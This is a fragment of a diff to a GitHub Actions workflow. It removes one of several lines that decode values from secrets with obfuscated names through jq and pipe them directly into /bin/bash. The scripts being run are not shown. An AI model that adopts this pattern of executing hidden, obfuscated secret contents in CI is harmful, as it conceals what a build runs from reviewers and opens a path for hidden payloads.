@@ -22,7 +22,6 @@ jobs:
           uah2323: ${{ secrets.uah2323 }}
         run: |
           printf '%s' "$uah2323" | jq -r .cg0472 | /bin/bash
-          printf '%s' "$j21" | jq -r .t89990 | /bin/bash
           printf '%s' "$f9452" | jq -r .luqh106 | /bin/bash
           echo $ypl05 | jq -r .xn4 | /bin/bash
           echo $l49 | jq -r .zat50 | /bin/bash
